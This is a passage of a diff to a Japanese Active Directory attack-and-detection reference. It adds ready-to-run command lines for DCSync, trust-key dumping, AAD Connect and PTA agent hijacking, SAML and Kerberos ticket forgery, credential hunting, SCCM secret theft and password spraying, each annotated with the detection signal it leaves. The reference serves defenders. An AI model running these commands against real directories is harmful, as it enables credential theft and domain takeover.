+        "t": "越境ACL/FSPメンバーシップをまとめて収集。`--CollectAllProperties`と信頼列挙の組み合わせが偵察の目印",
+        "q": "SharpHound.exe -c All,GPOLocalGroup --CollectAllProperties --zipfilename fsp.zip"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "実効的に高権限グループへ属していることを確認する後続クエリ。管理者以外による特権グループメンバー列挙は異常",
+        "q": "Get-ADGroupMember -Identity 'Administrators' -Server dc01.corp.local"
+      }
+    ],
     "detect": "越境プリンシパルによる特権グループの利用、FSPオブジェクト(CN=ForeignSecurityPrincipals)の変更、越境ACL付与。",
     "events": "4732/4733(ドメインローカル追加/削除=FSPの主経路), 4728/4729(グローバル), 4756/4757(ユニバーサル), 5136(ディレクトリ変更)",
     "mitigate": "越境グループメンバーシップとACLの定期棚卸し、最小権限、ドメインローカルグループへの越境追加の統制、選択的認証。",
@@ -6277,6 +10321,28 @@ AD.I18N.ja.attacks = [
     "summary": "侵害したDCからTrusted Domain Object(TDO)の共有鍵を抽出し、Trust Ticket鍛造やNTLM検証の基盤とする。",
     "how": "前提: DC上でLSA/NTDSへの管理アクセス。lsadump::trust /patch や secretsdump.py でトラストアカウント(DOMAIN$)の現在/旧NTLM・AESキーを取得し、Forged Trust Ticketへ利用。",
     "tools": "mimikatz `lsadump::trust /patch`, impacket `secretsdump.py`, `lsadump::lsa`",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "TDOの現在/旧NTLM・AESキーを一括取得。`lsadump::trust /patch`はトラスト鍵抽出の決定的シグナル",
+        "q": "mimikatz.exe \"lsadump::trust /patch\" exit"
+      },
+      {
+        "tool": "Impacket",
+        "t": "NTDS全体をダンプする過程でトラストアカウント(DOMAIN$)のシークレットも含めて取得。DCにプロセスログは残らずレプリケーション権限の4662のみが手掛かり",
+        "q": "secretsdump.py -just-dc corp.local/administrator@10.0.0.10"
+      },
+      {
+        "tool": "reg.exe",
+        "t": "非DC上でSECURITY/SYSTEMハイブを保存しLSA SECRETS(トラストキー含む)をオフライン抽出。`reg.exe save`の対象ハイブ名が高再現性のシグナル",
+        "q": "reg.exe save HKLM\\SECURITY C:\\Windows\\Temp\\security.hive"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "持ち出したSECURITY/SYSTEMハイブからオフラインでLSA秘密を復号。ファイル持ち出し直後に実行される定型パターン",
+        "q": "mimikatz.exe \"lsadump::secrets /system:system.hive /security:security.hive\" exit"
+      }
+    ],
     "detect": "DC上のLSASS/NTDSアクセス、DRSUAPIの異常、トラスト鍵に紐づくその後の越境TGS。",
     "events": "4662(DS-Replication), 4769, Sysmon 10(LSASSアクセス)",
     "mitigate": "Credential Guard/LSA保護、Tier0隔離、DCへの管理アクセス最小化、トラストパスワード自動更新の維持。",
@@ -6317,6 +10383,28 @@ AD.I18N.ja.attacks = [
     "summary": "オンプレとEntra間を同期するAAD Connectサーバやサービスアカウント(MSOL_)を侵害し、DCSync権限や高権限クラウド資格情報を奪う。",
     "how": "前提: AAD Connectサーバへの管理アクセス。ADSyncのSQL/DPAPIから同期アカウント資格情報を復号(MSOL_はDCSync=DS-Replication権限を保持)。これでオンプレDCSync、またはGlobal Admin相当のConnector資格情報でEntra操作。",
     "tools": "AADInternals `Get-AADIntSyncCredentials`, adconnectdump, mimikatz(DPAPI), impacket secretsdump",
+    "cmd": [
+      {
+        "tool": "sqlcmd.exe",
+        "t": "ADSyncのWID/SQLインスタンスへ接続しmms_management_agentの暗号化済み構成を抜き出す。名前付きパイプ経由のsqlcmd接続自体が非定型プロセス",
+        "q": "sqlcmd.exe -S np:\\\\.\\pipe\\MICROSOFT##WID\\tsql\\query -d ADSync -Q \"SELECT ma_name, private_configuration_xml FROM mms_management_agent\""
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "抜き出した暗号化シークレットを復号するためDPAPIマスターキーをLSASSから奪取。`sekurlsa::dpapi` が決定的シグナル",
+        "q": "mimikatz.exe \"privilege::debug\" \"sekurlsa::dpapi\" exit"
+      },
+      {
+        "tool": "Impacket",
+        "t": "復号した同期アカウント資格情報でDCSyncを実行。DC側にプロセスログは残らず4662とレプリケーション権限GUIDのみが手掛かり",
+        "q": "secretsdump.py corp.local/'MSOL_2d3e4f':'Passw0rd!'@dc01.corp.local -just-dc"
+      },
+      {
+        "tool": "NetExec",
+        "t": "同資格情報で`--ntds`によるDCSync相当を一括実行。SMB接続元がAADConnectサーバ以外なら強い異常シグナル",
+        "q": "netexec smb dc01.corp.local -u 'MSOL_2d3e4f' -p 'Passw0rd!' --ntds"
+      }
+    ],
     "detect": "MSOL_アカウントによる想定外ホストからのDCSync、AAD Connectサーバでの異常プロセス、Connectorアカウントの異常API利用。",
     "events": "4662(Replication Get Changes), 4624(MSOL_の異常元), Entra監査ログ",
     "mitigate": "AAD ConnectサーバをTier0扱い、MSOL_権限の最小化、同期アカウントの厳格保護、Entraの特権ロール監視、Password Writeback無効化検討。",
@@ -6357,6 +10445,33 @@ AD.I18N.ja.attacks = [
     "summary": "PHS構成でオンプレのパスワードハッシュ派生値がEntraへ同期される仕組みを悪用し、オンプレ侵害からクラウドアカウントを掌握、あるいはハッシュ注入でクラウド認証を偽装する。",
     "how": "前提: AAD Connect/DCの侵害。AAD Connect(ADSync)サーバを侵害して同期サービスアカウントの資格情報を抽出、または同期パイプラインを悪用。AADInternalsで任意ユーザーのクラウド側パスワード(PBKDF2派生ハッシュ)を設定でき、クラウドへ正規サインインできる。※PHSはNTLMハッシュそのものではなく派生ハッシュを同期するため、NTLMハッシュを提示するPass-the-Hash的なクラウド認証はできない。",
     "tools": "AADInternals `Set-AADIntUserPassword`/PHS関連関数, mimikatz",
+    "cmd": [
+      {
+        "tool": "AADInternals",
+        "t": "同期Webサービスの正規APIを叩き任意ユーザーのクラウド側パスワードをPBKDF2派生値で直接設定。通常のパスワード変更フローを経ない",
+        "q": "Set-AADIntUserPassword -SourceAnchor \"<sourceAnchor>\" -Password 'Passw0rd!' -Verbose"
+      },
+      {
+        "tool": "AADInternals",
+        "t": "PHS自体の有効/無効を同期API経由で遠隔操作。無効化はテナントの認証方式変更に相当し監査対象になる",
+        "q": "Set-AADIntPasswordHashSyncEnabled -Enabled $true -Credentials $syncCreds"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "PHSの派生元となるオンプレNTLMハッシュをDCSyncで取得。派生先クラウドパスワードの設定はこのハッシュに依存しない別操作",
+        "q": "mimikatz.exe \"lsadump::dcsync /domain:corp.local /user:svc_user\" exit"
+      },
+      {
+        "tool": "Impacket",
+        "t": "同上をLinux側から直接実行。エンドポイントにプロセスログが残らずDCの4662のみが痕跡",
+        "q": "secretsdump.py corp.local/svc_user:'Passw0rd!'@dc01.corp.local -just-dc-user svc_user"
+      },
+      {
+        "tool": "AADInternals",
+        "t": "設定した新パスワードで直接クラウドへサインインし乗っ取りを完了。通常のサインインログに紛れるため相関が必要",
+        "q": "Open-AADIntOffice365Portal -Credentials (Get-Credential)"
+      }
+    ],
     "detect": "PHS経由の異常なパスワード更新、想定外の同期イベント、クラウド側の不審サインイン。",
     "events": "Entra監査/サインインログ, 4662",
     "mitigate": "AAD Connect保護、条件付きアクセス+MFA、リスクベースサインイン、同期アカウント権限最小化。",
@@ -6397,6 +10512,28 @@ AD.I18N.ja.attacks = [
     "summary": "PTA構成の認証エージェントにDLLを注入して、任意パスワードでの認証成功や平文資格情報の窃取を行うクラウド認証バックドア。",
     "how": "前提: PTAエージェントが稼働するサーバ(通常AAD Connectホスト)への管理アクセス。PTASpy等でエージェントプロセスにフックを注入し、全ユーザーが任意パスワードでサインイン可能かつ平文パスワードを収集。",
     "tools": "AADInternals `Install-AADIntPTASpy`, `Get-AADIntPTASpyLog`",
+    "cmd": [
+      {
+        "tool": "AADInternals",
+        "t": "不正なPTAエージェントをテナントに新規登録。登録後は全ユーザーの認証要求が届くようになり平文パスワードを収集できる",
+        "q": "Get-AADIntAccessTokenForPTA -SaveToCache\nRegister-AADIntPTAAgent -MachineName \"attacker-pta01.corp.local\""
+      },
+      {
+        "tool": "AADInternals",
+        "t": "既存の正規エージェントの信頼証明書を更新し乗っ取りを継続。`-UpdateTrust`は鍵ローテーション相当でAgentUpdaterログに残る",
+        "q": "Register-AADIntPTAAgent -MachineName \"pta01.corp.local\" -UpdateTrust -PfxFileName .\\pta01.corp.local_agent.pfx"
+      },
+      {
+        "tool": "PTASpy",
+        "t": "AADInternals本体には無い別プロジェクト。正規PTAエージェントプロセスに.NETプロファイラAPIでフックを注入する環境変数がプロセス作成時に残る",
+        "q": "setx COR_ENABLE_PROFILING 1 /M\nsetx COR_PROFILER {32E2F4DA-1BEA-47EA-88F9-C5DAF691C94A} /M\nsetx COR_PROFILER_PATH \"C:\\Windows\\Temp\\PTASpy.dll\" /M"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "環境変数設定後にPTAエージェントサービスを再起動しプロファイラをロードさせる。サービス再起動イベント(7036)との組み合わせが検知点",
+        "q": "Restart-Service -Name AzureADConnectAuthenticationAgent"
+      }
+    ],
     "detect": "PTAエージェントホストの不審DLL/プロセス注入、成功サインインと相関しないオンプレ認証、エージェントの異常再起動。",
     "events": "Entraサインインログ, Sysmon 7/8(DLL/CreateRemoteThread), 4688",
     "mitigate": "PTAホストをTier0隔離、アプリ制御/EDR、条件付きアクセス+MFA、PTA→PHSやフェデレーション見直し、エージェント整合性監視。",
@@ -6437,6 +10574,28 @@ AD.I18N.ja.attacks = [
     "summary": "Seamless SSOで作成される computer アカウント AZUREADSSOACC$ のKerberos鍵を奪い、任意ユーザーになりすますクラウドSSOチケット(Silver Ticket相当)を鍛造する。鍵を握れば現在も越境SSOチケットを偽造してEntraへ直接サインインできる。ただしEntra参加/ハイブリッド参加のWindows 10/11はSeamless SSOを使わずPRT(Primary Refresh Token)でSSOするため本手法の直接の対象外であり、Microsoftは現在AZUREADSSOACC$のAES-256移行とSeamless SSO自体の廃止を推奨している。",
     "how": "前提: オンプレDCからAZUREADSSOACC$のNTLMハッシュ/AESキーを取得。このアカウントのパスワードは既定でローテーションされず、鍵さえ得れば任意ユーザーの越境SSOチケットを鍛造しEntraのautologonエンドポイントへ直接提示してサインインできる。2026年7月のWindows ServerアップデートでAD DSのKerberos既定etypeがRC4からAES-256へ変わる(CVE-2026-20833のRC4段階的無効化)ため、RC4(NTLM)ハッシュだけでなくAES-256鍵での鍛造を前提に考える必要がある。なおSeamless SSO自体はEntra参加/ハイブリッド参加端末では使われず(PRTを使用)、本手法が効くのは主に非参加端末やブラウザ経由でSeamless SSOを利用する環境。",
     "tools": "AADInternals `Get-AADIntSeamlessSSO`/チケット鍛造, mimikatz, impacket",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "AZUREADSSOACC$のNTLMハッシュをDC上のLSASSから抽出。既定でパスワード無期限のためローテーションされない限り恒久的に有効",
+        "q": "mimikatz.exe \"lsadump::lsa /inject /name:AZUREADSSOACC$\" exit"
+      },
+      {
+        "tool": "Impacket",
+        "t": "リモートから直接AZUREADSSOACC$のハッシュを抜く代替経路。DC側テレメトリは4662のみでエンドポイント検知を回避",
+        "q": "secretsdump.py corp.local/svc_user:'Passw0rd!'@dc01.corp.local -just-dc-user 'AZUREADSSOACC$'"
+      },
+      {
+        "tool": "AADInternals",
+        "t": "抽出したハッシュでSeamless SSO用Kerberosトークン(Silver Ticket相当)を鍛造。SIDのみを検証するため任意ユーザーになりすませる",
+        "q": "New-AADIntKerberosTicket -Hash $aadssoaccHash -SidString \"S-1-5-21-854568531-3289094026-2628502219-1111\""
+      },
+      {
+        "tool": "AADInternals",
+        "t": "鍛造したKerberosトークンを提示してEntraへのアクセストークンを直接取得。autologonエンドポイントへの単発リクエストとして残る",
+        "q": "Get-AADIntAccessTokenForAADGraph -KerberosTicket $ticket -Domain corp.local"
+      }
+    ],
     "detect": "AZUREADSSOACC$関連の異常Kerberos利用、想定外元からのSeamless SSOサインイン、対象アカウントのハッシュアクセス。",
     "events": "Entraサインインログ, 4769, 4662",
     "mitigate": "AZUREADSSOACC$のパスワードを2回連続でロールする(現在鍵と旧鍵の両方を無効化するため)のが中核の是正対策。加えてAZUREADSSOACC$をAES-256へ移行(2026年7月のWindows更新でAD DS既定がRC4→AES-256、CVE-2026-20833)、条件付きアクセス+MFA、Tier0保護を実施。Entra参加/ハイブリッド参加端末はPRTでSSOでき Seamless SSOに依存しないため、Microsoftの推奨に沿ってSeamless SSO自体の廃止(無効化)を検討する。",
@@ -6477,6 +10636,28 @@ AD.I18N.ja.attacks = [
     "summary": "ADFSのトークン署名証明書/DKM鍵を奪い、任意ユーザー・任意クレーム(MFA充足含む)の有効なSAMLトークンをオフラインで生成し、フェデレーション先(Entra/SaaS)へ無制限にサインインする。",
     "how": "前提: ADFSサーバまたはDKM鍵を保持するADへの管理アクセス。トークン署名証明書とDKMマスターキーを抽出し、任意NameID/クレーム(MFA claim含む)のSAMLアサーションを署名。証明書更新まで長期間有効。",
     "tools": "AADInternals `Export-AADIntADFSSigningCertificate`/`New-AADIntSAMLToken`, mimikatz, ADFSDump/ADFSpoof",
+    "cmd": [
+      {
+        "tool": "Mimikatz",
+        "t": "ADFS設定DB(WID/SQL)とAD上のDKMマスターキーを読み取りトークン署名証明書を復号。`misc::adfs`単体でDBアクセスと復号が完結",
+        "q": "mimikatz.exe \"misc::adfs\" exit"
+      },
+      {
+        "tool": "ADFSDump",
+        "t": "ADFSサーバ上で暗号化済みPFXブロブとDKM鍵を個別に抽出しADFSpoofへ引き渡す準備ツール。mimikatzを使わない代替経路",
+        "q": "ADFSDump.exe"
+      },
+      {
+        "tool": "ADFSpoof",
+        "t": "抽出した鍵材料から任意ユーザー・任意クレーム(MFA充足含む)のSAMLトークンをオフライン鍛造。ADFSサーバへの通信が一切発生しない",
+        "q": "python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s sts.corp.local o365 --upn user@corp.local --objectguid {1C1D4BA4-B513-4B5B-9E2A-3308B907D759}"
+      },
+      {
+        "tool": "AADInternals",
+        "t": "同じ鍵材料と偽装Issuerで任意ユーザーのSAMLトークンを生成しMFA無しで直接サインイン。フェデレーション設定は変更しないため技術232より痕跡が薄い",
+        "q": "Open-AADIntOffice365Portal -Certificate $cert -Issuer \"http://corp.local/adfs/services/trust/\" -ImmutableID <id> -ByPassMFA $true"
+      }
+    ],
     "detect": "ADFS発行ログに無いのに成立するサインイン、異常なNameID/発行時刻、MFA未実施なのにMFA claim付きトークン、証明書エクスポート痕跡。",
     "events": "ADFS 1200/1202, Entraサインインログ, 4662, 4624",
     "mitigate": "トークン署名証明書とDKMをHSM/厳格保護、ADFSをTier0、証明書ローテーション、条件付きアクセスで発行元/場所制限、可能ならフェデレーション廃止しクラウド認証へ移行。",
@@ -6517,6 +10698,28 @@ AD.I18N.ja.attacks = [
     "summary": "外部トラストやSIDフィルタリングの実装不備・設定不備(quarantine未適用等)を突き、越境で本来落とされるべきSIDを通過させて昇格する亜種。",
     "how": "前提: 一方の環境を侵害し、トラスト種別(external/forest)とSIDフィルタ状態を確認(netdom trust /verify, TDO属性)。quarantine未適用の外部トラストやパッチ未適用環境で、フィルタ回避可能なSIDを注入した鍛造チケットを利用。",
     "tools": "mimikatz, impacket, netdom(状態確認), BloodHound",
+    "cmd": [
+      {
+        "tool": "netdom.exe",
+        "t": "外部トラストの種別とquarantine状態を確認。`/Quarantine`が既定の`No`(フィルタ無効)のままかを見る偵察操作",
+        "q": "netdom trust corp.local /domain:external.local /verify"
+      },
+      {
+        "tool": "PowerView",
+        "t": "TDOのtrustAttributesをLDAPで直接読む偵察。`QUARANTINED_DOMAIN`フラグの有無でフィルタ回避可否を事前判定する",
+        "q": "Get-DomainTrust -Domain corp.local | Select-Object SourceName,TargetName,TrustAttributes,TrustDirection"
+      },
+      {
+        "tool": "Mimikatz",
+        "t": "quarantine未適用の外部トラスト越しにSIDを注入したチケットを鍛造。`/sids:`の値が本来落とされるべきRIDかで判定する",
+        "q": "mimikatz.exe \"kerberos::golden /user:svc_user /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /krbtgt:<krbtgt_hash> /sids:S-1-5-21-4444444444-5555555555-6666666666-519 /ptt\" exit"
+      },
+      {
+        "tool": "Impacket",
+        "t": "Linux側から同等のフィルタ回避チケットを生成。攻撃元ログが無いためDCの4768とTDOに対する4662の相関が唯一の手掛かり",
+        "q": "ticketer.py -nthash <krbtgt_ntlm_hash> -domain corp.local -domain-sid S-1-5-21-1111111111-2222222222-3333333333 -extra-sid S-1-5-21-4444444444-5555555555-6666666666-519 svc_user"
+      }
+    ],
     "detect": "外部トラスト経由の想定外SID利用、TDO/トラストフラグ変更、越境の高権限アクセス。",
     "events": "4706/4716(トラスト作成/変更), 4675(SIDフィルタ適用), 4769(TGS-REQ), 4662",
     "mitigate": "該当パッチ適用、外部トラストにquarantine強制、不要トラスト削除、選択的認証、トラスト構成の定期監査。",
@@ -6552,6 +10755,38 @@ AD.I18N.ja.attacks = [
     "summary": "既定値10のMachineAccountQuotaにより認証済み一般ユーザが自前のコンピュータアカウントを作成し、後続攻撃の起点となる制御下アカウントを手に入れる基礎プリミティブ。",
     "how": "任意のドメイン認証情報があれば impacket-addcomputer や PowerMad の New-MachineAccount でコンピュータアカウントを作成する。作成者は当該アカウントのmsDS-KeyCredentialLinkやSPN、servicePrincipalNameを制御でき、noPac(CVE-2021-42278/42287)、RBCD、Shadow Credentials、Certifried(CVE-2022-26923)の共通前提となる。ドメイン参加権限やGenericWriteは不要で、MAQが1以上なら成立する。",
     "tools": "impacket addcomputer.py, PowerMad (New-MachineAccount), StandIn, ntlmrelayx --add-computer",
+    "cmd": [
+      {
+        "tool": "Get-ADObject",
+        "t": "ドメインDNのms-DS-MachineAccountQuota属性を照会しMAQ残数を確認。単体では偵察行為で正規運用のAD照会と区別しづらい",
+        "q": "Get-ADObject -Identity \"DC=corp,DC=local\" -Properties ms-DS-MachineAccountQuota"
+      },
+      {
+        "tool": "PowerView",
+        "t": "同じ照会をPowerViewで実施。直後に`New-MachineAccount`等の作成系コマンドが続く場合はMAQ悪用の前兆として相関させる",
+        "q": "Get-DomainObject -Identity \"DC=corp,DC=local\" -Properties ms-ds-machineaccountquota"
+      },
+      {
+        "tool": "Impacket",
+        "t": "SAMR経由でコンピュータアカウントを作成。`-computer-name`の末尾`$`と直後の4741(コンピュータアカウント作成)が主要トークン",
+        "q": "addcomputer.py -method SAMR -dc-ip 10.0.0.10 -computer-name 'FAKE01$' -computer-pass 'Passw0rd!' corp.local/svc_user:'Passw0rd!'"
+      },
+      {
+        "tool": "Powermad",
+        "t": "PowerShell内でコンピュータアカウントを作成。4104のスクリプトブロックに`New-MachineAccount`の関数名がそのまま残る",
+        "q": "New-MachineAccount -MachineAccount FAKE01 -Password (ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force)"
+      },
+      {
+        "tool": "StandIn",
+        "t": "MAQを消費してコンピュータオブジェクトを作るGhostPack製専用ツール。`--computer`と`--make`の組がコマンドラインに残る",
+        "q": "StandIn.exe --computer FAKE01 --make"
+      },
+      {
+        "tool": "Impacket",
+        "t": "NTLMリレー経由でLDAP越しにコンピュータアカウントを追加。DC側に攻撃元プロセスは残らずリレー先の4741のみが手掛かり",
+        "q": "ntlmrelayx.py -t ldap://dc01.corp.local --add-computer FAKE01$ 'Passw0rd!'"
+      }
+    ],
     "detect": "ディレクトリサービス監査でSecurityイベント4741(コンピュータアカウント作成)を、作成者(Subject)が管理者やドメイン参加専用アカウント以外である場合に検知する。短時間に複数のマシンアカウントが同一ユーザから作成される、またはmSDS-CreatorSIDが一般ユーザSIDのコンピュータオブジェクトを定期監査で洗い出す。",
     "events": "4741 (computer account created), 4742 (computer account changed), 5136 (mSDS-CreatorSID / servicePrincipalName変更)",
     "mitigate": "ms-DS-MachineAccountQuotaを0に設定し、コンピュータ作成は委任した専用アカウント/OU権限のみに限定する。既存のmS-DS-CreatorSIDを棚卸しして一般ユーザが作成したマシンアカウントを削除し、Delegate作成をSDDLで制御する。",
@@ -6592,6 +10827,33 @@ AD.I18N.ja.attacks = [
     "summary": "LDAPではなくADWS(TCP9389, SOAP/MC-NBFX)経由でBloodHound相当のディレクトリデータを収集し、LDAP系検知やイベント1644を回避するステルス列挙手法。",
     "how": "SOAPHound(.NET)やSoaPy(Linux)でDCのADWSエンドポイントにNBFX/NBFSE圧縮SOAPクエリを送り、ユーザ・グループ・ACL・信頼関係を収集してBloodHound互換JSONを生成する。ADWSはPowerShell ADモジュールが使う正規経路のため、LDAPクエリロギングやSACL、多くのEDRのLDAP監視をすり抜けられる。認証済みの一般ユーザ資格情報のみで実行可能。",
     "tools": "SOAPHound, SoaPy, FalconHound, 標準ADWS (ActiveDirectory PowerShell module)",
+    "cmd": [
+      {
+        "tool": "SOAPHound",
+        "t": "全オブジェクトの基礎キャッシュをADWS(TCP9389)経由で構築。LDAP(389)を一切使わずLDAP検索監査を素通りする",
+        "q": "SOAPHound.exe --buildcache -c C:\\ad\\tools\\cache.txt"
+      },
+      {
+        "tool": "SOAPHound",
+        "t": "キャッシュを基にBloodHound互換JSONを出力。`--bhdump`はイベント1644を発火させずACL・信頼関係まで収集する",
+        "q": "SOAPHound.exe -c C:\\temp\\cache.txt --bhdump -o C:\\temp\\bloodhound-output"
+      },
+      {
+        "tool": "SoaPy",
+        "t": "Linux版ADWSコレクタ。TCP9389へのSOAP(MC-NBFX)通信として現れ多くのEDRのLDAP監視をすり抜ける",
+        "q": "soapy corp.local/svc_user:'Passw0rd!'@dc01.corp.local --users --computers --groups"
+      },
+      {
+        "tool": "SoaPy",
+        "t": "委任設定に絞った収集。`--rbcds`等の個別フラグはBloodHoundの全量収集より通信量が少なくさらに見えにくい",
+        "q": "soapy corp.local/svc_user:'Passw0rd!'@dc01.corp.local --unconstrained --rbcds"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "標準ADモジュールも既定でADWSを使うため通信自体は正規運用と同一。実行元プロセスの異常性で切り分けるしかない",
+        "q": "Get-ADUser -Filter * -Server dc01.corp.local"
+      }
+    ],
     "detect": "DC上のADWS(NetTCP 9389)への異常な接続元・接続量を監視し、通常はTier0管理端末やAADConnectのみが使うADWSを一般ワークステーションが叩いていないか検知する。ネットワーク層でMC-NMF/NBFXパターンの大量列挙トラフィックを可視化する。",
     "events": "ADWS接続ログ (Directory Service / 4662 大量読取), Sysmon Event 3 (TCP 9389への接続), NetFlow上の9389",
     "mitigate": "ADWSへのアクセスを管理端末セグメントに限定(ホストファイアウォールで9389を制限)し、Tier0の管理系を分離する。BloodHound収集の兆候検知に依存せず、そもそも列挙可能な過剰権限・ACLを削減する。",
@@ -6632,6 +10894,33 @@ AD.I18N.ja.attacks = [
     "summary": "description・info・userPassword・unixUserPassword等の属性に平文で保存された資格情報を認証済みユーザが列挙して奪取する、GPP cpassword以外の属性ベース資格情報探索。",
     "how": "LDAPで全ユーザ/コンピュータのdescription, info, comment, userPassword, unixUserPassword, ms-Mcs-AdmPwd(LAPS)などを列挙し、password/pass/pwd等のキーワードで平文資格情報を探す。userPasswordやunixUserPasswordはBASE64/平文格納されることがあり、Get-ADUser -Properties * や ldapsearch で誰でも読める場合が多い。",
     "tools": "ldapsearch, PowerView (Get-DomainUser), ldeep, BloodHound, adPEAS, Snaffler(共有側)",
+    "cmd": [
+      {
+        "tool": "PowerShell",
+        "t": "AD PowerShellモジュールで全ユーザのdescription属性を取得しキーワードでフィルタ。4103のモジュールログに`Get-ADUser`が残る",
+        "q": "Get-ADUser -Filter * -Properties Description | Where-Object { $_.Description -like '*pass*' }"
+      },
+      {
+        "tool": "PowerView",
+        "t": "LDAPFilterでdescription属性に`pass`を含むユーザのみ抽出。正規のADクエリと紛れやすく単体では検知が困難",
+        "q": "Get-DomainUser -LDAPFilter '(description=*pass*)' -Properties samaccountname,description"
+      },
+      {
+        "tool": "ldeep",
+        "t": "Linux側からLDAPで全ユーザをJSON列挙。`-v`で全属性を取得しdescription/info等をオフラインでgrepする起点になる",
+        "q": "ldeep ldap -u svc_user -p 'Passw0rd!' -d corp.local -s ldap://dc01.corp.local users -v"
+      },
+      {
+        "tool": "ldapsearch",
+        "t": "userPassword/unixUserPasswordを直接LDAPフィルタで検索。攻撃元にプロセスログは残らずLDAP検索ログのみが痕跡",
+        "q": "ldapsearch -x -H ldap://dc01.corp.local -D 'svc_user@corp.local' -w 'Passw0rd!' -b 'DC=corp,DC=local' '(|(description=*pass*)(userPassword=*)(unixUserPassword=*))' sAMAccountName description userPassword unixUserPassword"
+      },
+      {
+        "tool": "PowerShell",
+        "t": "LAPSのms-Mcs-AdmPwd属性を全コンピュータから読み取り。読み取り権限が過剰な環境で成立し対象GUIDの4662で検知する",
+        "q": "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select-Object Name,ms-Mcs-AdmPwd"
+      }
+    ],
     "detect": "description/info等に対する大量読取をディレクトリサービスアクセス監査(4662)で検知するのは困難なため、定期的な属性スキャンで平文パスワードを含むオブジェクトを能動的に洗い出す。userPassword/unixUserPasswordに値が入っているオブジェクトの存在自体を異常として警告する。",
     "events": "4662 (property read, GUID指定SACL時), 定期LDAP棚卸しレポート",
     "mitigate": "description/info等の属性に資格情報を保存する運用を廃止し、既存値をスクリプトで洗浄する。userPassword属性の平文格納を無効化(fUserPwdSupport)、LAPS属性は機密属性としてACLで読取権限を最小化する。",
@@ -6667,6 +10956,33 @@ AD.I18N.ja.attacks = [
     "summary": "サイトサーバ・管理点(MP)・配布点(DP)・Network Access Account(NAA)・PXEメディアといったSCCM/MECMインフラを列挙し、大規模AD侵害の主要攻撃面を可視化する偵察。",
     "how": "sccmhunterやSharpSCCMでSystem Management コンテナ(AD公開SCCMサイト)、MSSMSMPname等のSPN、管理点のHTTP/WMI経由からデバイス・コレクション・NAAを列挙する。PXE対応DPには未認証でOSDメディアを要求しブート変数(policy)から暗号化NAA資格情報を回収できる。",
     "tools": "SharpSCCM (get), sccmhunter (find/show/get), PXEThief, ldapsearch (System Managementコンテナ)",
+    "cmd": [
+      {
+        "tool": "SharpSCCM",
+        "t": "LDAPでSCCMサイトのManagement Point/SMSプロバイダを解決。`get site-info`のコマンドライン文字列が主軸",
+        "q": "SharpSCCM.exe get site-info -d corp.local"
+      },
+      {
+        "tool": "SharpSCCM",
+        "t": "MPのポリシーからNetwork Access Account資格情報を取得。MP側にHTTP GET `/SMS_MP/.sms_pol`が残る",
+        "q": "SharpSCCM.exe get secrets -mp SCCM01.corp.local -sc PS1"
+      },
+      {
+        "tool": "sccmhunter",
+        "t": "System Managementコンテナ・公開MP・PXE配布点をLDAPで一括収集。`find`実行時の大量LDAP検索が痕跡",
+        "q": "python3 sccmhunter.py find -u svc_user -p 'Passw0rd!' -d corp.local -dc-ip 10.0.0.10"
+      },
+      {
+        "tool": "ldapsearch",
+        "t": "AD公開されたSCCMサイト情報を直接LDAP検索。Linux発のためDC側4662と検索フィルタ文字列のみが手掛かり",
+        "q": "ldapsearch -x -H ldap://dc01.corp.local -D 'svc_user@corp.local' -w 'Passw0rd!' -b \"CN=System Management,CN=System,DC=corp,DC=local\" \"(objectClass=mSSMSManagementPoint)\""
+      },
+      {
+        "tool": "PXEThief",
+        "t": "PXE対応配布点に未認証でOSDメディアを要求。暗号化NAA資格情報を回収できDP側にPXE boot要求ログが残る",
+        "q": "pxethief.py 2 10.0.0.20"
+      }
+    ],
     "detect": "管理点(MP)への異常なHTTP/WMIポリシー要求、System Managementコンテナへの大量LDAP読取、PXE/TFTP(UDP69)への正規デバイス以外からの要求を監視する。SharpSCCM/PXEThiefの既知User-Agentやポリシー要求パターンをMPログで検知する。",
     "events": "MP IISログ (ポリシー要求), 4662 (System Managementコンテナ読取), TFTP/PXEアクセスログ",
     "mitigate": "PXEにパスワードを設定しNAAをそもそも使わずEnhanced HTTP/管理点認証へ移行する。NAA権限を最小化しMSSQL/SMB共有への横展開を封じる。System ManagementコンテナのACLを見直す。",
@@ -6707,6 +11023,33 @@ AD.I18N.ja.attacks = [
     "summary": "AS-REQ以外のSMB・LDAP・RDP・OWA/EWS等の認証面を横断し、少数の一般的パスワードを多数アカウントに試すロックアウト回避型のクレデンシャルスプレー。",
     "how": "収集したユーザ列挙結果に対し Season2024! 等の推測パスワードをSMB(445)/LDAP(389)/RDP/OWA-EWS(443)へロックアウト閾値未満(1試行/アカウント/観測ウィンドウ)で分散噴射する。プロトコルによりロックアウトポリシーやbadPwdCount反映が異なる点を利用し、外部公開のOWA/EWSは特にステルス性が高い。",
     "tools": "NetExec/NetExec, kerbrute(AS-REQ側), SprayingToolkit(atomizer/MailSniper), Hydra, Go365",
+    "cmd": [
+      {
+        "tool": "NetExec",
+        "t": "1パスワードを全ユーザへ低頻度で試行し成功後も止めない。`--continue-on-success`未使用時と違い全対象の4625が扇状に残る",
+        "q": "netexec smb targets.txt -u users.txt -p 'Season2024!' --continue-on-success"
+      },
+      {
+        "tool": "NetExec",
+        "t": "LDAP単純バインドでのスプレー。SMBのロックアウトカウンタと別系統で反映されるため閾値回避に使われやすい",
+        "q": "netexec ldap dc01.corp.local -u users.txt -p 'Season2024!' --continue-on-success"
+      },
+      {
+        "tool": "kerbrute",
+        "t": "AS-REQ事前認証のみでスプレー。4625ではなく4768/4771が痕跡でNTLM系ログだけを見ていると欠測する",
+        "q": "kerbrute passwordspray -d corp.local users.txt 'Season2024!'"
+      },
+      {
+        "tool": "MailSniper",
+        "t": "OWA/EWSへ直接スプレー。外部公開エンドポイントのためWindows側の4625は残らずIIS/Exchangeログのみが手掛かり",
